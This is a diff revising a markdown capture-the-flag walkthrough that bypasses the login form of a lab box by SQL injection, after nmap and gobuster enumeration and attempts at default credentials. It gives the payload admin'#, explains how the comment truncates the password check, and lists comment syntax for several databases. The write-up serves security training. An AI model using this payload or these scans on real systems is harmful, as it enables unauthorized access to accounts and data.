@@ -1,100 +1,107 @@
-# 🛡️ SQL Injection Login Bypass – CTF Walkthrough
+# SQL injection — login bypass (walkthrough)
 
-This box revolved around classic SQL injection through a login portal. After service enumeration and brute-force login attempts failed, we successfully bypassed the login via input manipulation.
+Classic **authentication bypass** via unsanitized SQL in a login form. Enumeration shows HTTP only; directory brute force finds nothing obvious; injection succeeds with a comment terminator in the username field.
 
 ---
 
-## 🔍 1. Nmap Enumeration
+## 1. Port scan
 
-Started with a full port and version scan:
+**Command:**
 
 ```bash
 nmap -sV -p- 10.129.241.26
 ```
 
+| Flag | Purpose |
+|------|---------|
+| `-sV` | Service/version detection on open ports |
+| `-p-` | All 65535 TCP ports (slow; use for small labs or after a quick top-1000 scan) |
+
 **Result:**
-- Port `80/tcp` open – HTTP web server detected
-- Server version appeared secure (no known vulnerabilities)
+
+- **TCP 80** — HTTP web server.
+- No other listening ports required for this chain.
 
 ---
 
-## 🌐 2. Web App Discovery
+## 2. Web application
 
-Navigated to `http://10.129.241.26/` and found a **login portal**.
-
----
-
-## 🔐 3. Default Credential Attempts
-
-Tried common usernames to guess default creds:
-
-- `admin`
-- `administrator`
-- `root`
-- `guest`
-- `user`
-
-None succeeded.
+Browse to `http://10.129.241.26/` and identify the **login** form (username + password fields).
 
 ---
 
-## 📁 4. Directory Enumeration with Gobuster
+## 3. Default credentials
 
-Next, used `gobuster` to look for hidden directories:
+Attempt common usernames (with guessed passwords or empty) before deeper testing:
+
+- `admin`, `administrator`, `root`, `guest`, `user`
+
+None succeeded in this scenario.
+
+---
+
+## 4. Directory enumeration
+
+**Command:**
 
 ```bash
 gobuster dir --url http://10.129.241.26/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-**Outcome:**
-- No relevant directories discovered
+| Flag | Purpose |
+|------|---------|
+| `dir` | HTTP path brute-force mode |
+| `--url` | Base URL including scheme |
+| `-w` | Wordlist path |
+
+**Outcome:** no extra directories materially changed the attack path (adjust wordlist/size for other targets).
 
 ---
 
-## 🧨 5. SQL Injection Login Bypass
+## 5. SQL injection — login bypass
 
-With no luck from creds or directories, tested an **SQL injection** payload in the username field.
+### Payload (example)
 
-### Payload:
 ```text
 Username: admin'#
 Password: anything
 ```
 
-### Why It Worked
+### Mechanism
 
-This input likely manipulated the backend SQL query:
+Backend query pattern (illustrative):
 
 ```sql
 SELECT * FROM users WHERE username = 'admin'#' AND password = '...';
 ```
 
-The `#` comment character **truncated the password clause**, turning the query into:
+In MySQL/MariaDB, **`#`** starts a comment, so the rest of the line (including the password check) is ignored:
 
 ```sql
 SELECT * FROM users WHERE username = 'admin';
 ```
 
-If a user named `admin` exists in the database, the query returns true, and access is granted without password validation.
+If `admin` exists, the application may treat the login as successful **without** verifying the password.
+
+**Note:** comment characters differ by DBMS (`-- ` requires trailing space; `/* */` for Oracle-style). Always map the stack (error messages, timing, WAF) before choosing payloads.
 
 ---
 
-## ✅ Summary Table
+## Summary table
 
-| Step                  | Command / Action                                                           |
-|-----------------------|----------------------------------------------------------------------------|
-| Port Scan             | `nmap -sV -p- 10.129.241.26`                                               |
-| Directory Enumeration | `gobuster dir --url http://10.129.241.26/ -w common.txt`                  |
-| SQL Injection         | Username: `admin'#` <br> Password: anything                               |
-| Auth Bypass Success   | Logged in without valid credentials via SQL comment injection             |
+| Step | Command / action |
+|------|-------------------|
+| Port scan | `nmap -sV -p- 10.129.241.26` |
+| Directories | `gobuster dir --url http://10.129.241.26/ -w /usr/share/wordlists/dirb/common.txt` |
+| Bypass | Username: `admin'#` (or equivalent), arbitrary password |
+| Result | Authenticated session without valid password pair |
 
 ---
 
-## 🧠 Key Takeaways
+## Key takeaways
 
-- SQL injection remains a critical web app vulnerability if input is not sanitized.
-- Comments (`#`, `--`, `/* */`) are powerful tools in injection payloads.
-- Always test for input validation bypasses in login and search forms.
-- Combine enumeration (Nmap, Gobuster) with application logic testing for best results.
+- SQL injection in **login** fields can bypass authentication if queries concatenate user input.
+- Comment-based truncation (`#`, `--`) is one of the simplest patterns to test.
+- Combine **port scan**, **content discovery**, and **manual injection**; do not stop at failed default creds.
 
-**Box completed. Full pwn via login bypass. 🏁**
+**Status:** objectives completed via SQL injection and login bypass.
